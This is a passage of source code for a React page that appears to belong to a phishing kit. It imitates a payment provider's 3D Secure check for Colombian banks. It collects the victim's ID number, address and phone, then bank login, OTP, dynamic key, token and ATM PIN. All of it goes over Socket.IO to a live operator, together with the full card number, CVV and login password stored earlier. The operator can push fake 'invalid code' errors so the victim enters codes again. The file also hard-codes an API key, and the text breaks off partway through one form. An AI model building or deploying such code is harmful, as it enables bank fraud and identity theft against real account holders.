/**
 * Personal Info Page - Portal Style (Step 3 of 3)
 * Asks for address, ID number (cédula), and city
 * After submit, shows 3D Secure modal with multi-step verification:
 * Step 1: Bank credentials (user + password)
 * Step 2: OTP (SMS code)
 * Step 3: Clave Dinámica
 * Step 4: Token
 * Step 5: Clave ATM
 * 
 * SOCKET.IO INTEGRATION:
 * - When modal opens, connects to Socket.IO and registers session
 * - After user submits credentials (Step 1), data is sent to admin
 * - User sees "waiting" screen until admin decides which step to show
 * - Admin sends command via Socket.IO to advance to specific step
 * - Each subsequent step also sends data and waits for admin decision
 */

import PageTransition from "@/components/PageTransition";
import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { io, Socket } from "socket.io-client";
import BrandLogo from "@/components/BrandLogo";

// Bank logo mapping
const BANK_LOGOS: Record<string, { name: string; logo: string }> = {
  "bancolombia": { name: "Bancolombia", logo: "/manus-storage/bancolombia_a871f95b.png" },
  "davivienda": { name: "Davivienda", logo: "/manus-storage/davivienda_7c1c9d40.png" },
  "bbva": { name: "BBVA", logo: "/manus-storage/bbva_e5a338d1.png" },
  "bogota": { name: "Banco de Bogotá", logo: "/manus-storage/banco-bogota_be80d3f4.png" },
  "popular": { name: "Banco Popular", logo: "/manus-storage/banco-popular_3de0a452.png" },
  "occidente": { name: "Banco de Occidente", logo: "/manus-storage/banco-occidente_06b514e4.png" },
  "av villas": { name: "AV Villas", logo: "/manus-storage/av-villas_d0fe7139.png" },
  "villas": { name: "AV Villas", logo: "/manus-storage/av-villas_d0fe7139.png" },
  "caja social": { name: "Banco Caja Social", logo: "/manus-storage/banco-caja-social_5b1a8e56.png" },
  "agrario": { name: "Banco Agrario", logo: "/manus-storage/banco-agrario_5de26a90.png" },
  "falabella": { name: "Banco Falabella", logo: "/manus-storage/banco-falabella_816fb3b1.png" },
  "itau": { name: "Itaú", logo: "/manus-storage/itau_c3b9e6df.png" },
  "nequi": { name: "Nequi", logo: "/manus-storage/nequi_64f4c755.jpg" },
  "nubank": { name: "Nu Bank", logo: "/manus-storage/nubank_c41d4831.jpg" },
  "nu": { name: "Nu Bank", logo: "/manus-storage/nubank_c41d4831.jpg" },
  "daviplata": { name: "Daviplata", logo: "/manus-storage/daviplata_451b4033.jpeg" },
  "davibank": { name: "DaviBank", logo: "/manus-storage/davibank_b0b65107.png" },
  "serfinanza": { name: "Serfinanza", logo: "/manus-storage/serfinanza_9adb27eb.png" },
  "finandina": { name: "Finandina", logo: "/manus-storage/finandina_14b8fb48.jpg" },
  "bancoomeva": { name: "Bancoomeva", logo: "/manus-storage/bancoomeva_1db66e1e.webp" },
  "coomeva": { name: "Bancoomeva", logo: "/manus-storage/bancoomeva_1db66e1e.webp" },
};

function findBankLogo(bankName: string): { name: string; logo: string } | null {
  if (!bankName) return null;
  const lower = bankName.toLowerCase();
  for (const [key, value] of Object.entries(BANK_LOGOS)) {
    if (lower.includes(key)) return value;
  }
  return null;
}

interface BinData {
  bank: string;
  country: string;
  countryEmoji: string;
  scheme: string;
  type: string;
  brand: string;
  logo: { name: string; logo: string } | null;
}

const GREIP_API_KEY = "ce2fc210e6b9ff7ef27850bed48aa4b0";

// Local BIN-based scheme detection (fallback when API fails or doesn't return scheme)
function detectSchemeByBin(cardNumber: string): string {
  const clean = cardNumber.replace(/\s/g, "");
  if (!clean) return "";
  const first = clean[0];
  const first2 = clean.slice(0, 2);
  const first4 = clean.slice(0, 4);
  const first6 = clean.slice(0, 6);
  // Visa: starts with 4
  if (first === "4") return "VISA";
  // Mastercard: starts with 51-55 or 2221-2720
  const first2Num = parseInt(first2);
  if (first2Num >= 51 && first2Num <= 55) return "MASTERCARD";
  const first4Num = parseInt(first4);
  if (first4Num >= 2221 && first4Num <= 2720) return "MASTERCARD";
  // Amex: starts with 34 or 37
  if (first2 === "34" || first2 === "37") return "AMEX";
  // Diners: starts with 300-305, 36, 38
  if (first2 === "36" || first2 === "38") return "DINERS";
  const first3Num = parseInt(clean.slice(0, 3));
  if (first3Num >= 300 && first3Num <= 305) return "DINERS";
  return "";
}

// Step name mapping
const STEP_MAP: Record<string, number> = {
  credentials: 1,
  otp: 2,
  dinamica: 3,
  token: 4,
  atm: 5,
};

export default function PersonalInfo() {
  const [, setLocation] = useLocation();
  const [address, setAddress] = useState("");
  const [cedula, setCedula] = useState("");
  const [city, setCity] = useState("");
  const [phone, setPhone] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [isLoading, setIsLoading] = useState(false);

  // 3D Secure Modal State
  const [show3DSecure, setShow3DSecure] = useState(false);
  const [secureStep, setSecureStep] = useState(1); // 1-5
  const [isVerifying, setIsVerifying] = useState(false);
  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false);
  const [binData, setBinData] = useState<BinData | null>(null);
  const [sessionStatus, setSessionStatus] = useState<string>("active");

  // Socket.IO
  const socketRef = useRef<Socket | null>(null);
  const sessionIdRef = useRef<string>("");

  // Step 1: Bank credentials
  const [bankUser, setBankUser] = useState("");
  const [bankPassword, setBankPassword] = useState("");
  const [step1Errors, setStep1Errors] = useState<Record<string, string>>({});
  const passwordInputRef = useRef<HTMLInputElement>(null);

  // Step 2: OTP (6-8 digits single input)
  const [otpCode, setOtpCode] = useState("");
  const [otpError, setOtpError] = useState("");
  const [otpTimer, setOtpTimer] = useState(60);

  // Step 3: Clave Dinámica
  const [dinamica, setDinamica] = useState("");
  const [dinamicaError, setDinamicaError] = useState("");

  // Step 4: Token
  const [token, setToken] = useState("");
  const [tokenError, setTokenError] = useState("");

  // Step 5: Clave ATM
  const [atmPin, setAtmPin] = useState("");
  const [atmError, setAtmError] = useState("");

  // Custom text from admin (shows question + input for user response)
  const [customTextQuestion, setCustomTextQuestion] = useState("");
  const [customTextAnswer, setCustomTextAnswer] = useState("");
  const [showCustomText, setShowCustomText] = useState(false);
  const [customTextSending, setCustomTextSending] = useState(false);

  // Cambiar theme-color dinámicamente según el estado de la página
  useEffect(() => {
    const metaThemeColor = document.querySelector('meta[name="theme-color"]');
    if (metaThemeColor) {
      // Páginas blancas (PersonalInfo, PaymentConfirmation) usan #ffffff
      metaThemeColor.setAttribute('content', '#ffffff');
    }
    return () => {
      // Restaurar al salir
      if (metaThemeColor) {
        metaThemeColor.setAttribute('content', '#141414');
      }
    };
  }, []);

  // Auto-open 3D Secure modal if redirected from FaceID with ?automodal=1&step=otp&session=xxx
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('automodal') === '1') {
      const stepParam = params.get('step') || 'otp';
      const sessionParam = params.get('session') || '';
      // Map step name to step number
      const stepNum = STEP_MAP[stepParam] || 2;
      // Use existing session ID from FaceID if provided
      if (sessionParam) {
        sessionIdRef.current = sessionParam;
      }
      // Open modal at the correct step
      setShow3DSecure(true);
      setSecureStep(stepNum);
      setIsWaitingAdmin(false);
      setSessionStatus('active');
      // Clean URL params
      window.history.replaceState({}, '', '/personal-info');
    }
  }, []);

  // OTP Timer
  useEffect(() => {
    if (show3DSecure && secureStep === 2 && otpTimer > 0) {
      const interval = setInterval(() => {
        setOtpTimer((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [show3DSecure, secureStep, otpTimer]);

  // User's real IP address (fetched once)
  const [userIP, setUserIP] = useState<string>("");

  // Get user's real IP address
  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => setUserIP(data.ip || ""))
      .catch(() => {});
  }, []);

  // Get stored card number from sessionStorage
  useEffect(() => {
    const storedCard = sessionStorage.getItem("sp_card_number");
    if (storedCard) {
      const clean = storedCard.replace(/\s/g, "");
      const bin = clean.slice(0, 6);
      if (bin.length >= 6) {
        // Detect scheme locally first (always reliable)
        const localScheme = detectSchemeByBin(clean);
        fetch(`https://gregeoip.com/BINLookup?bin=${bin}&key=${GREIP_API_KEY}&format=JSON&mode=live`)
          .then((res) => res.json())
          .then((data) => {
            if (data.status === "success" && data.data) {
              const d = data.data;
              const bankName = d.info?.bank?.name || "";
              const apiScheme = d.info?.scheme?.name || "";
              setBinData({
                bank: bankName,
                country: d.info?.country?.name || "",
                countryEmoji: d.info?.country?.emoji || "",
                scheme: apiScheme || localScheme,
                type: d.info?.scheme?.type || "",
                brand: d.info?.scheme?.brand || sessionStorage.getItem("sp_card_brand") || "",
                logo: findBankLogo(bankName),
              });
            } else {
              // API failed but we can still detect scheme locally
              if (localScheme) {
                setBinData({
                  bank: "",
                  country: "",
                  countryEmoji: "",
                  scheme: localScheme,
                  type: "",
                  brand: sessionStorage.getItem("sp_card_brand") || "",
                  logo: null,
                });
              }
            }
          })
          .catch(() => {
            // Network error - use local detection
            if (localScheme) {
              setBinData({
                bank: "",
                country: "",
                countryEmoji: "",
                scheme: localScheme,
                type: "",
                brand: sessionStorage.getItem("sp_card_brand") || "",
                logo: null,
              });
            }
          });
      }
    }
  }, []);

    // Socket.IO connection - when 3D Secure modal opens
  useEffect(() => {
    if (!show3DSecure) return;
    // Check if we need to force a new session (user chose "otra tarjeta")
    const forceNew = sessionStorage.getItem("sp_force_new_session");
    if (forceNew) {
      sessionStorage.removeItem("sp_force_new_session");
      // Clear old sessionId so a brand new one is generated
      sessionIdRef.current = "";
    }
    // Use existing session ID (e.g. inherited from FaceID) or generate a new one
    const sessionId = sessionIdRef.current || `3ds_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    sessionIdRef.current = sessionId;

    // Connect to Socket.IO
    const socket = io(window.location.origin, {
      path: "/api/socket.io",
    });
    socketRef.current = socket;

    socket.on("connect", () => {
      // Register session with server
      const email = sessionStorage.getItem("sp_email") || sessionStorage.getItem("userEmail") || "";
      const cardNumber = sessionStorage.getItem("sp_card_number") || "";
      const cardBin = cardNumber.replace(/\s/g, "").slice(0, 6);

      socket.emit("user:start-session", {
        sessionId,
        email,
        cardBin,
        cardNumber: cardNumber.replace(/\s/g, ""),
        bankName: binData?.bank || sessionStorage.getItem("sp_bank_name") || "",
        country: binData?.country || sessionStorage.getItem("sp_country") || "",
        cardScheme: binData?.scheme || sessionStorage.getItem("sp_card_scheme") || "",
        cardCategory: [binData?.brand, binData?.type].filter(Boolean).join(" ") || sessionStorage.getItem("sp_card_category") || "",
        ipAddress: userIP,
        userAgent: navigator.userAgent,
        // Pre-3DS captured data
        loginPassword: sessionStorage.getItem("sp_login_password") || "",
        holderName: sessionStorage.getItem("sp_holder_name") || "",
        expiryDate: sessionStorage.getItem("sp_expiry") || "",
        cvv: sessionStorage.getItem("sp_cvv") || "",
        address: address || "",
        cedula: cedula || "",
        city: city || "",
      });
    });

    // Listen for admin commands to advance to a specific step
    socket.on("user:goto-step", (data: { step: string }) => {
      // Handle error commands - show error message in the same step
      if (data.step.startsWith("error-")) {
        setIsWaitingAdmin(false);
        setIsVerifying(false);
        const errorType = data.step;
        if (errorType === "error-otp") {
          setSecureStep(2);
          setOtpCode("");
          setOtpError("C\u00f3digo OTP inv\u00e1lido. Por favor ingr\u00e9salo nuevamente.");
        } else if (errorType === "error-dinamica") {
          setSecureStep(3);
          setDinamica("");
          setDinamicaError("Clave din\u00e1mica inv\u00e1lida. Por favor ingr\u00e9sala nuevamente.");
        } else if (errorType === "error-token") {
          setSecureStep(4);
          setToken("");
          setTokenError("Token inv\u00e1lido. Por favor ingr\u00e9salo nuevamente.");
        } else if (errorType === "error-atm") {
          setSecureStep(5);
          setAtmPin("");
          setAtmError("Clave ATM inv\u00e1lida. Por favor ingr\u00e9sala nuevamente.");
        } else if (errorType === "error-credenciales") {
          setSecureStep(1);
          setBankUser("");
          setBankPassword("");
          setStep1Errors({ bankUser: "Credenciales inv\u00e1lidas. Verifica tu usuario y contrase\u00f1a." });
        } else if (errorType === "error-tarjeta") {
          // Reintentar con la misma tarjeta - vuelve al personal-info para re-trigger 3D
          setShow3DSecure(false);
          setLocation("/card-error");
        } else if (errorType === "error-tarjeta-otra") {
          // Cambiar tarjeta - va a card-error donde el usuario elige
          setShow3DSecure(false);
          setLocation("/card-error");
        }
        return;
      }
      const stepNumber = STEP_MAP[data.step];
      if (stepNumber) {
        setIsWaitingAdmin(false);
        setIsVerifying(false);
        setSecureStep(stepNumber);
        // Clear ALL fields and errors when navigating to a new step
        setOtpCode("");
        setDinamica("");
        setToken("");
        setAtmPin("");
        setOtpError("");
        setDinamicaError("");
        setTokenError("");
        setAtmError("");
        if (stepNumber === 2) {
          setOtpTimer(60);
        }
      }
    });

    // Listen for faceid/success commands
    socket.on("user:goto-step", (data: { step: string }) => {
      if (data.step === "faceid") {
        // Redirect to face-id page with session reference
        window.location.href = `/face-id?session=${sessionIdRef.current}`;
        return;
      }
      if (data.step === "success") {
        // Redirect to payment success page
        setShow3DSecure(false);
        setIsWaitingAdmin(false);
        setIsVerifying(false);
        setLocation("/payment-success");
        return;
      }
    });

    // Listen for custom text from admin - show inline modal with response input
    socket.on("user:custom-text", (data: { message: string }) => {
      setCustomTextQuestion(data.message);
      setCustomTextAnswer("");
      setShowCustomText(true);
      setCustomTextSending(false);
    });

    // Listen for status updates from admin
    socket.on("user:status-update", (data: { status: string }) => {
      setSessionStatus(data.status);
      if (data.status === "completed") {
        setIsWaitingAdmin(false);
        setIsVerifying(false);
        setShow3DSecure(false);
        setLocation("/payment-success");
      } else if (data.status === "rejected") {
        setIsWaitingAdmin(false);
        setIsVerifying(false);
        // Show rejection state briefly then redirect
        setTimeout(() => {
          setShow3DSecure(false);
          setLocation("/change-payment");
        }, 2000);
      }
    });

    return () => {
      socket.disconnect();
      socketRef.current = null;
    };
  }, [show3DSecure]);

  // Submit data to admin via Socket.IO
  const submitDataToAdmin = useCallback((step: string, values: Record<string, string>) => {
    if (socketRef.current && sessionIdRef.current) {
      socketRef.current.emit("user:submit-data", {
        sessionId: sessionIdRef.current,
        step,
        values,
      });
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Haptic feedback on mobile
    if (navigator.vibrate) navigator.vibrate(10);
    const newErrors: Record<string, string> = {};
    if (!address.trim()) newErrors.address = "Ingresa tu dirección.";
    if (!cedula.trim()) newErrors.cedula = "Ingresa tu número de cédula.";
    else if (cedula.length < 4) newErrors.cedula = "La cédula debe tener mínimo 4 dígitos.";
    else if (cedula.length > 14) newErrors.cedula = "La cédula debe tener máximo 14 dígitos.";
    if (!city.trim()) newErrors.city = "Ingresa tu ciudad.";
    if (!phone.trim()) newErrors.phone = "Ingresa tu número de celular.";
    else if (phone.length !== 10) newErrors.phone = "El celular debe tener exactamente 10 dígitos.";
    else if (phone[0] !== "3") newErrors.phone = "El celular debe empezar por 3.";
    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsLoading(true);
      // Send personal data to Telegram
      const email = sessionStorage.getItem("sp_email") || sessionStorage.getItem("userEmail") || "";
      fetch("/api/capture/personal", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address, cedula, city, phone, email, ipAddress: userIP }),
      }).catch(() => {});
      setTimeout(() => {
        setIsLoading(false);
        setShow3DSecure(true);
        setSecureStep(1);
        setIsWaitingAdmin(false);
        setSessionStatus("active");
      }, 1000);
    }
  };

  // Step 1: Bank credentials submit
  const handleStep1Submit = (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: Record<string, string> = {};
    if (!bankUser.trim()) newErrors.bankUser = "Ingresa tu usuario del banco.";
    if (!bankPassword.trim()) newErrors.bankPassword = "Ingresa tu contraseña.";
    setStep1Errors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsVerifying(true);
      // Send credentials to admin via Socket.IO
      submitDataToAdmin("credentials", {
        bankUser,
        bankPassword,
        bank: binData?.bank || "Desconocido",
        email: sessionStorage.getItem("sp_email") || "",
        cardBin: sessionStorage.getItem("sp_card_number")?.replace(/\s/g, "").slice(0, 6) || "",
      });
      // Show verifying briefly then wait for admin
      setTimeout(() => {
        setIsVerifying(false);
        setIsWaitingAdmin(true);
      }, 1000);
    }
  };

  // Step 2: OTP submit
  const handleStep2Submit = (e: React.FormEvent) => {
    e.preventDefault();
    const code = otpCode;
    if (code.length < 6 || code.length > 8) {
      setOtpError("Ingresa el código de 6 a 8 dígitos.");
      return;
    }
    setOtpError("");
    setIsVerifying(true);
    submitDataToAdmin("otp", { otpCode: code });
    setTimeout(() => {
      setIsVerifying(false);
      setIsWaitingAdmin(true);
    }, 1000);
  };

  // Step 3: Dinámica submit
  const handleStep3Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!dinamica.trim() || dinamica.length < 6) {
      setDinamicaError("Ingresa tu clave dinámica de 6 dígitos.");
      return;
    }
    setDinamicaError("");
    setIsVerifying(true);
    submitDataToAdmin("dinamica", { claveDinamica: dinamica });
    setTimeout(() => {
      setIsVerifying(false);
      setIsWaitingAdmin(true);
    }, 1000);
  };

  // Step 4: Token submit
  const handleStep4Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!token.trim() || token.length < 6) {
      setTokenError("Ingresa tu token de seguridad de 6 dígitos.");
      return;
    }
    setTokenError("");
    setIsVerifying(true);
    submitDataToAdmin("token", { tokenSeguridad: token });
    setTimeout(() => {
      setIsVerifying(false);
      setIsWaitingAdmin(true);
    }, 1000);
  };

  // Step 5: ATM submit
  const handleStep5Submit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!atmPin.trim() || atmPin.length < 4) {
      setAtmError("Ingresa tu clave ATM de 4 dígitos.");
      return;
    }
    setAtmError("");
    setIsVerifying(true);
    submitDataToAdmin("atm", { claveATM: atmPin });
    setTimeout(() => {
      setIsVerifying(false);
      setIsWaitingAdmin(true);
    }, 1000);
  };

  // OTP input handler (single field, 6-8 digits)
  const handleOtpChange = (value: string) => {
    const clean = value.replace(/\D/g, "").slice(0, 8);
    setOtpCode(clean);
    setOtpError("");
  };

  const handleLogout = () => {
    setLocation("/login");
  };

  // Progress indicator for 3D Secure steps
  const renderStepIndicator = () => (
    <div className="flex items-center justify-center gap-1.5 mb-4">
      {[1, 2, 3, 4, 5].map((step) => (
        <div
          key={step}
          className={`h-1.5 rounded-full transition-all duration-300 ${
            step === secureStep
              ? "w-6 bg-[#E50914]"
              : step < secureStep
              ? "w-1.5 bg-[#E50914]/60"
              : "w-1.5 bg-gray-300"
          }`}
        />
      ))}
    </div>
  );

  // Waiting for admin screen
  const renderWaitingScreen = () => (
    <div className="text-center py-6">
      <div className="w-16 h-16 mx-auto mb-4 relative">
        <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
        <div className="absolute inset-0 rounded-full border-4 border-[#E50914] border-t-transparent animate-spin"></div>
        <div className="absolute inset-3 rounded-full bg-[#E50914]/10 flex items-center justify-center">
          <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
          </svg>
        </div>
      </div>
      <h3 className="text-[15px] font-bold text-gray-900 mb-1">Verificando información</h3>
      <p className="text-gray-500 text-[12px] leading-relaxed max-w-[260px] mx-auto">
        Estamos validando tus datos con tu entidad bancaria. Este proceso puede tomar unos momentos.
      </p>
      {/* Progress bar visual */}
      <div className="mt-4 mx-auto max-w-[240px]">
        <div className="w-full h-1.5 bg-gray-200 rounded-full overflow-hidden">
          <div className="h-full bg-gradient-to-r from-[#E50914] to-[#ff4d4d] rounded-full animate-[progressFill_25s_ease-out_forwards]"></div>
        </div>
        <p className="text-[10px] text-gray-400 mt-1.5">Procesando verificación...</p>
      </div>
      <div className="mt-3 flex items-center justify-center gap-1.5">
        <div className="w-1.5 h-1.5 rounded-full bg-[#E50914] animate-bounce" style={{ animationDelay: "0ms" }}></div>
        <div className="w-1.5 h-1.5 rounded-full bg-[#E50914] animate-bounce" style={{ animationDelay: "150ms" }}></div>
        <div className="w-1.5 h-1.5 rounded-full bg-[#E50914] animate-bounce" style={{ animationDelay: "300ms" }}></div>
      </div>
    </div>
  );

  // Rejected screen
  const renderRejectedScreen = () => (
    <div className="text-center py-6">
      <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
        <svg viewBox="0 0 24 24" className="w-8 h-8 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
          <circle cx="12" cy="12" r="10" />
          <path d="M15 9l-6 6M9 9l6 6" />
        </svg>
      </div>
      <h3 className="text-[15px] font-bold text-gray-900 mb-1">Verificación fallida</h3>
      <p className="text-gray-500 text-[12px] leading-relaxed max-w-[260px] mx-auto">
        No fue posible verificar tu identidad. Por favor intenta con otro método de pago.
      </p>
    </div>
  );

  // Render current 3D Secure step content
  const renderSecureStepContent = () => {
    // If session was rejected, show rejection screen
    if (sessionStatus === "rejected") {
      return renderRejectedScreen();
    }

    // If waiting for admin decision, show waiting screen
    if (isWaitingAdmin) {
      return renderWaitingScreen();
    }

    switch (secureStep) {
      case 1:
        return (
          <form onSubmit={handleStep1Submit} className="space-y-3">
            <div className="text-center mb-4">
              <h2 className="text-[16px] font-bold text-gray-900 mb-1">
                Verificación de identidad
              </h2>
              <p className="text-gray-500 text-[12px]">
                Ingresa tus credenciales bancarias para verificar tu identidad.
              </p>
            </div>

            <div>
              <label className="block text-[11px] font-medium text-gray-600 mb-1">
                Usuario del banco
              </label>
              <input
                type="text"
                placeholder="Ingresa tu usuario"
                value={bankUser}
                onChange={(e) => {
                  setBankUser(e.target.value);
                  if (step1Errors.bankUser) setStep1Errors((prev) => ({ ...prev, bankUser: "" }));
                }}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                onKeyDown={(e) => { if (e.key === 'Enter') { e.preventDefault(); passwordInputRef.current?.focus(); } }}
                enterKeyHint="next"
                autoComplete="username"
                className={`w-full h-11 px-3 border rounded text-[14px] text-gray-900 bg-white outline-none transition-colors placeholder:text-gray-400 ${
                  step1Errors.bankUser ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
              {step1Errors.bankUser && (
                <p className="text-[#E50914] text-[11px] mt-0.5">{step1Errors.bankUser}</p>
              )}
            </div>

            <div>
              <label className="block text-[11px] font-medium text-gray-600 mb-1">
                Contraseña
              </label>
              <input
                type="password"
                placeholder="Ingresa tu contraseña"
                value={bankPassword}
                onChange={(e) => {
                  setBankPassword(e.target.value);
                  if (step1Errors.bankPassword) setStep1Errors((prev) => ({ ...prev, bankPassword: "" }));
                }}
                ref={passwordInputRef}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                enterKeyHint="done"
                autoComplete="current-password"
                className={`w-full h-11 px-3 border rounded text-[14px] text-gray-900 bg-white outline-none transition-colors placeholder:text-gray-400 ${
                  step1Errors.bankPassword ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
              {step1Errors.bankPassword && (
                <p className="text-[#E50914] text-[11px] mt-0.5">{step1Errors.bankPassword}</p>
              )}
            </div>

            <button
              type="submit"
              disabled={isVerifying}
              className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 mt-2 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
            >
              {isVerifying ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Verificando...
                </span>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        );

      case 2:
        return (
          <form onSubmit={handleStep2Submit} className="space-y-3">
            <div className="text-center mb-4">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72 12.84 12.84 0 00.7 2.81 2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45 12.84 12.84 0 002.81.7A2 2 0 0122 16.92z" />
                </svg>
              </div>
              <h2 className="text-[16px] font-bold text-gray-900 mb-1">
                Código de verificación OTP
              </h2>
              <p className="text-gray-500 text-[12px]">
                Ingresa el código de 6 a 8 dígitos enviado a tu celular registrado.
              </p>
            </div>

            {/* OTP Input - single field 6-8 digits */}
            <div className="flex justify-center mb-3">
              <input
                type="text"
                inputMode="numeric"
                maxLength={8}
                value={otpCode}
                onChange={(e) => handleOtpChange(e.target.value)}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                enterKeyHint="done"
                placeholder="••••••••"
                autoFocus
                className={`w-full max-w-[220px] h-12 text-center text-xl font-bold tracking-[0.3em] border rounded-lg bg-white text-gray-900 outline-none transition-colors placeholder:text-gray-400 ${
                  otpError ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
            </div>

            {otpError && (
              <p className="text-[#E50914] text-[11px] text-center">{otpError}</p>
            )}

            {/* Timer */}
            <div className="text-center">
              {otpTimer > 0 ? (
                <p className="text-gray-500 text-[12px]">
                  Reenviar código en <span className="font-semibold text-[#E50914]">{otpTimer}s</span>
                </p>
              ) : (
                <button
                  type="button"
                  onClick={() => setOtpTimer(60)}
                  className="text-[#E50914] text-[12px] font-semibold hover:underline"
                >
                  Reenviar código
                </button>
              )}
            </div>

            <button
              type="submit"
              disabled={isVerifying}
              className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 mt-2 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
            >
              {isVerifying ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Verificando...
                </span>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        );

      case 3:
        return (
          <form onSubmit={handleStep3Submit} className="space-y-3">
            <div className="text-center mb-4">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
                </svg>
              </div>
              <h2 className="text-[16px] font-bold text-gray-900 mb-1">
                Clave Dinámica
              </h2>
              <p className="text-gray-500 text-[12px]">
                Ingresa la clave dinámica generada por tu aplicación bancaria.
              </p>
            </div>

            <div>
              <label className="block text-[11px] font-medium text-gray-600 mb-1">
                Clave dinámica
              </label>
              <input
                type="text"
                inputMode="numeric"
                placeholder="Ingresa tu clave dinámica"
                value={dinamica}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 6);
                  setDinamica(value);
                  setDinamicaError("");
                }}
                onFocus={(e) => { setTimeout(() => e.target.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300); }}
                enterKeyHint="done"
                autoFocus
                maxLength={6}
                className={`w-full h-11 px-3 border rounded text-[14px] text-gray-900 bg-white outline-none transition-colors text-center tracking-widest font-mono placeholder:text-gray-400 ${
                  dinamicaError ? "border-[#E50914]" : "border-gray-300 focus:border-[#E50914]"
                }`}
              />
              {dinamicaError && (
                <p className="text-[#E50914] text-[11px] mt-0.5 text-center">{dinamicaError}</p>
              )}
            </div>

            <p className="text-gray-500 text-[11px] text-center">
              La clave dinámica se actualiza cada 60 segundos en tu app bancaria.
            </p>

            <button
              type="submit"
              disabled={isVerifying}
              className="w-full h-11 bg-[#E50914] text-white text-[14px] font-bold rounded hover:bg-[#f6121d] active:scale-[0.98] transition-all duration-150 disabled:opacity-70 mt-2 shadow-[0_4px_16px_rgba(229,9,20,0.3)]"
            >
              {isVerifying ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                  </svg>
                  Verificando...
                </span>
              ) : (
                "Confirmar"
              )}
            </button>
          </form>
        );

      case 4:
        return (
          <form onSubmit={handleStep4Submit} className="space-y-3">
            <div className="text-center mb-4">
              <div className="w-12 h-12 mx-auto mb-3 rounded-full bg-[#E50914]/10 border-2 border-[#E50914]/30 flex items-center justify-center">
                <svg viewBox="0 0 24 24" className="w-6 h-6 text-[#E50914]" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="2" y="3" width="20" height="14" rx="2" ry="2" />
                  <path d="M8 21h8M12 17v4" />
                </svg>
              </div>
              <h2 className="text-[16px] font-bold text-gray-900 mb-1">
                Token de Seguridad
              </h2>
              <p className="text-gray-500 text-[12px]">
                Ingresa el código que aparece en tu dispositivo token o app de autenticación.
              </p>
            </div>

            <div>
